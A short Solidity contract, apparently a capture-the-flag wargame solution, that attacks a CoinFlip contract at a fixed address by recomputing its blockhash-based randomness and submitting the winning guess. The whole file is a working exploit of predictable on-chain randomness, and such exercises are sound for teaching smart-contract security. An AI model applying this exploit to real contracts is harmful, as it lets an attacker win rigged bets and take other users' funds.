// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.21;

import {CoinFlip} from "../CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlip = CoinFlip(payable(0x3b79471666148Dcc581CA296A835D830Efa00C2a));

    uint256 public lastHash;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public returns (bool) {
	uint256 blockValue = uint256(blockhash(block.number - 1));

	if (lastHash == blockValue) {
	    revert();
	}

	lastHash = blockValue;
	uint256 guess = blockValue / FACTOR;
	return coinFlip.flip(guess == 1);
    }

    function consecutiveWins() public view returns (uint256) {
	return coinFlip.consecutiveWins();
    }
}
